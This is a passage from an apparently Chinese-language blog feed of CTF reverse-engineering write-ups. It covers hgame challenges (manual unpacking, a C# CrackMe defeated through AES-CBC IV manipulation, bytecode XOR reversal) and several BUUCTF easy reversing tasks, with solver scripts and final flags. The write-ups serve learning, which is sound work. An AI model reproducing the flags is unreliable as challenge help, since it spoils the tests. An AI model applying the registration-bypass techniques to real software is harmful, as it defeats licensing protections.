class="hljs-built_in">fclose</span>(dumpfile);</span><br><span class="line">    }<span class="hljs-keyword">else</span> <span class="hljs-built_in">Message</span>(<span class="hljs-string">"dump err."</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">dump</span><span class="hljs-params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">auto</span> i;</span><br><span class="line">  <span class="hljs-keyword">auto</span> size;</span><br><span class="line">  size=endimg-startimg;</span><br><span class="line">  <span class="hljs-built_in">fseek</span>(dumpfile,offset,<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i=<span class="hljs-number">0</span>; i &lt; size; i=i+<span class="hljs-number">1</span> ) </span><br><span class="line">  {</span><br><span class="line"><span class="hljs-built_in">fputc</span>(<span class="hljs-built_in">Byte</span>(startimg+i),dumpfile);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">scanf</span>((__int64)<span class="hljs-string">"%42s"</span>, v7);</span><br><span class="line">  v5 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">41</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( i + v7[i] != (<span class="hljs-keyword">unsigned</span> __int8)byte_6CA0A0[i] )</span><br><span class="line">      v5 = <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v0 = <span class="hljs-string">"Wrong input"</span>;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Wrong input"</span>, v7);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v0 = <span class="hljs-string">"Congratulations! Flag is your input"</span>;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulations! Flag is your input"</span>, v7);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ida_chars[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">0x68</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x49</span>,</span><br><span class="line">                    <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x65</span>,</span><br><span class="line">                    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x4D</span>,</span><br><span class="line">                    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x95</span>,</span><br><span class="line">                    <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA6</span></span><br><span class="line">            };</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">42</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            flag+=ida_chars[i]-i;</span><br><span class="line">        }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最后输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hgame</span>{Unp@cking_<span class="hljs-number">1</span>s_R<span class="hljs-number">0</span>m<span class="hljs-number">4</span>ntic_f<span class="hljs-number">0</span>r_r<span class="hljs-number">3</span>vers<span class="hljs-number">1</span>ng}</span><br></pre></td></tr></tbody></table></figure><h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p><p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">{</span><br><span class="line">if (this.status == 1)</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("你已经激活成功啦，快去提交flag吧~~~");</span><br><span class="line">return;</span><br><span class="line">}</span><br><span class="line">string text = this.textBox1.Text;</span><br><span class="line">if (text.Length != 46 || text.IndexOf("hgame{") != 0 || text.IndexOf("}") != 45)</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("Illegal format");</span><br><span class="line">return;</span><br><span class="line">}</span><br><span class="line">string base64iv = text.Substring(6, 24);</span><br><span class="line">string str = text.Substring(30, 15);</span><br><span class="line">try</span><br><span class="line">{</span><br><span class="line">Aes aes = new Aes("SGc0bTNfMm8yMF9XZWVLMg==", base64iv);</span><br><span class="line">Aes aes2 = new Aes("SGc0bTNfMm8yMF9XZWVLMg==", "MFB1T2g5SWxYMDU0SWN0cw==");</span><br><span class="line">string text2 = aes.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=");</span><br><span class="line">if (text2.Equals("Same_ciphertext_"))</span><br><span class="line">{</span><br><span class="line">byte[] array = new byte[16];</span><br><span class="line">Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);</span><br><span class="line">if (Convert.ToBase64String(array).Equals("dJntSWSPWbWocAq4yjBP5Q=="))</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("注册成功！");</span><br><span class="line">this.Text = "已激活，欢迎使用！";</span><br><span class="line">this.status = 1;</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("注册失败！\nhint: " + aes2.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">else</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("注册失败！\nhint: " + aes2.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">catch</span><br><span class="line">{</span><br><span class="line">MessageBox.Show("注册失败！");</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p><p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p><p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p><p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p><p>直接python解决：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AesCrypter</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, key, iv</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.iv = iv</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pkcs7padding</span>(<span class="hljs-params">self, text</span>):</span></span><br><span class="line">        bs = AES.block_size  <span class="hljs-comment"># 16</span></span><br><span class="line"></span><br><span class="line">        length = <span class="hljs-built_in">len</span>(text)</span><br><span class="line">        bytes_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(text, encoding=<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        padding_size = length <span class="hljs-keyword">if</span> (bytes_length == length) <span class="hljs-keyword">else</span> bytes_length</span><br><span class="line">        padding = bs - padding_size % bs</span><br><span class="line">        padding_text = <span class="hljs-built_in">chr</span>(padding) * padding</span><br><span class="line">        <span class="hljs-keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pkcs7unpadding</span>(<span class="hljs-params">self, text</span>):</span></span><br><span class="line">        length = <span class="hljs-built_in">len</span>(text)</span><br><span class="line">        unpadding = <span class="hljs-built_in">ord</span>(text[length - <span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">return</span> text[<span class="hljs-number">0</span>:length - unpadding]</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">self, content</span>):</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        content_padding = self.pkcs7padding(content)</span><br><span class="line">        aes_encode_bytes = cipher.encrypt(<span class="hljs-built_in">bytes</span>(content_padding, encoding=<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        result = base64.b64encode(aes_encode_bytes).decode(encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">self, content</span>):</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="hljs-comment"># base64解码</span></span><br><span class="line">        aes_encode_bytes = base64.b64decode(content)</span><br><span class="line">        <span class="hljs-comment"># 解密</span></span><br><span class="line">        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)</span><br><span class="line">        <span class="hljs-comment"># 重新编码</span></span><br><span class="line">        result = aes_decode_bytes.decode(encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        <span class="hljs-comment"># 去除填充内容</span></span><br><span class="line">        result = self.pkcs7unpadding(result)</span><br><span class="line">        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">None</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">""</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = base64.b64decode(<span class="hljs-string">"SGc0bTNfMm8yMF9XZWVLMg=="</span>)</span><br><span class="line">fakeIV = base64.b64decode(<span class="hljs-string">'MFB1T2g5SWxYMDU0SWN0cw=='</span>)</span><br><span class="line">plainText = <span class="hljs-string">"Same_ciphertext_"</span></span><br><span class="line">ciperText = <span class="hljs-string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span></span><br><span class="line"></span><br><span class="line">aesCipher = AesCrypter(key, fakeIV)</span><br><span class="line"></span><br><span class="line">fakePlainText = aesCipher.decrypt(ciperText)</span><br><span class="line"><span class="hljs-comment"># print(fakePlainText)</span></span><br><span class="line">IV = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):</span><br><span class="line">    IV += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(fakePlainText[i]) ^ fakeIV[i] ^ <span class="hljs-built_in">ord</span>(plainText[i]))</span><br><span class="line"><span class="hljs-comment"># print("IV : " + IV)</span></span><br><span class="line"><span class="hljs-comment"># /TyXYzPnY;$)\we_</span></span><br><span class="line">IV = base64.b64encode(IV.encode(<span class="hljs-string">'utf-8'</span>)).decode(<span class="hljs-string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">cipherText2 = aesCipher.encrypt(plainText)</span><br><span class="line">cipherText2 = base64.b64decode(cipherText2).<span class="hljs-built_in">hex</span>()[:<span class="hljs-number">32</span>]</span><br><span class="line">cipherText3 = <span class="hljs-string">'dJntSWSPWbWocAq4yjBP5Q=='</span></span><br><span class="line">cipherText3 = base64.b64decode(cipherText3).<span class="hljs-built_in">hex</span>()[:<span class="hljs-number">32</span>]</span><br><span class="line"><span class="hljs-comment"># print(cipherText2 + cipherText3)</span></span><br><span class="line">cipherText4 = <span class="hljs-built_in">bytes</span>.fromhex(cipherText2 + cipherText3)</span><br><span class="line">cipherText4 = base64.b64encode(cipherText4)</span><br><span class="line"><span class="hljs-comment"># print(cipherText4)</span></span><br><span class="line">plainText3 = aesCipher.decrypt(cipherText4)</span><br><span class="line"><span class="hljs-comment"># print(plainText3)</span></span><br><span class="line"><span class="hljs-comment"># Same_ciphertext_DiFfer3Nt_w0r1d</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">flag += <span class="hljs-string">'hgame{'</span> + IV + plainText3[<span class="hljs-number">16</span>:] + <span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</span></span><br></pre></td></tr></tbody></table></figure><p>最终的flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hgame</span>{L<span class="hljs-number">1</span>R<span class="hljs-number">5</span>WFl<span class="hljs-number">6</span>UG<span class="hljs-number">5</span>ZOyQpXHdlXw==DiFfer<span class="hljs-number">3</span>Nt_w<span class="hljs-number">0</span>r<span class="hljs-number">1</span>d}</span><br></pre></td></tr></tbody></table></figure><h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p><p>dis指令表见<a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p><p>还原出来的函数原型（想打死命名的人）</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">OOo</span>):</span></span><br><span class="line"> O0O = OOo[::-<span class="hljs-number">1</span>]</span><br><span class="line"> O0o = <span class="hljs-built_in">list</span>(O0O)</span><br><span class="line"> <span class="hljs-keyword">for</span> O0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(O0o)):</span><br><span class="line"> Oo = O0o[O0-<span class="hljs-number">1</span>] ^ O0o[O0]</span><br><span class="line"> O0o[O0] = Oo</span><br><span class="line"> O = <span class="hljs-built_in">bytes</span>(O0o)</span><br><span class="line"> <span class="hljs-keyword">return</span> O.<span class="hljs-built_in">hex</span>()</span><br></pre></td></tr></tbody></table></figure><p>所以只需要反过来异或一遍就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">'7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22'</span>)</span><br><span class="line">c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">    c[i] ^= c[i - <span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(c[::-<span class="hljs-number">1</span>]))</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hgame</span>{sT<span class="hljs-number">4</span>cK_<span class="hljs-number">1</span>$_sO_e@Sy~~}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-re部分题解</title>
      <link href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>看到有些大佬在做BUUCTF的题，看了一下，题目很多，但是感觉良莠不齐，并且开始的一些题目有些太简单了，就当是多做些题目了。</p><span id="more"></span><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>确实非常easy，直接拖进IDA看到flag</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{this_Is_a_EaSyRe}</span><br></pre></td></tr></tbody></table></figure><h4 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h4><p>IDA打开，通过字符串窗口找到主程序，整个程序流程很简单</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; ; ++j )</span><br><span class="line">  {</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = <span class="hljs-built_in">j_strlen</span>(Str2);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v8 &gt; v2 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( Str2[j] == <span class="hljs-string">'o'</span> )</span><br><span class="line">      Str2[j] = <span class="hljs-string">'0'</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">sub_1400111D1</span>(<span class="hljs-string">"input the flag:"</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_14001128F</span>(<span class="hljs-string">"%20s"</span>, &amp;Str1);</span><br><span class="line">  v3 = <span class="hljs-built_in">j_strlen</span>(Str2);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;Str1, Str2, v3) )</span><br><span class="line">    <span class="hljs-built_in">sub_1400111D1</span>(<span class="hljs-string">"this is the right flag!\n"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">sub_1400111D1</span>(<span class="hljs-string">"wrong flag\n"</span>);</span><br></pre></td></tr></tbody></table></figure><p>只有这一部分有用，str2时内存中的一个字符串，只是将输入的字符串和变换过后的str2进行一个简单的对比，一样则输出正确</p><p>str2的变换就是将所有的o变换成0，str2为‘{hello_world}’，所以flag为</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{hell0_w0rld}</span><br></pre></td></tr></tbody></table></figure><h4 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h4><p>和上一题完全一样，只不过时ELF64文件，把i和r全部替换成了1</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{hack1ng_fo1_fun}</span><br></pre></td></tr></tbody></table></figure><h4 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h4><p>安卓逆向，直接apktool反编译，在MainActivity.smail文件里找到了flag</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{7631a988259a00816deda84afb29430a}</span><br></pre></td></tr></tbody></table></figure><h4 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h4><p>简单加壳软件，在加壳时没做任何的修改，直接upx脱壳，IDA反编译，通过字符串直接找到flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{HappyNewYear!}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h4><p>IDA反编译可以直接发现flag，把花括号里的放进flag{}里即可</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">49</span>d<span class="hljs-number">3</span>c<span class="hljs-number">93</span>df<span class="hljs-number">25</span>caad<span class="hljs-number">81232130</span>f<span class="hljs-number">3</span>d<span class="hljs-number">2</span>ebfad}</span><br></pre></td></tr></tbody></table></figure><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>一看题目就是到要逆运算异或，反编译之后发现关键运算</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">33</span>; ++i )</span><br><span class="line">    v6[i] ^= v6[i - <span class="hljs-number">1</span>];</span><br><span class="line">  v3 = global;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(v6, global, <span class="hljs-number">0x21</span>uLL) )</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Success"</span>, v3);</span><br></pre></td></tr></tbody></table></figure><p>所以逆运算就好了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span 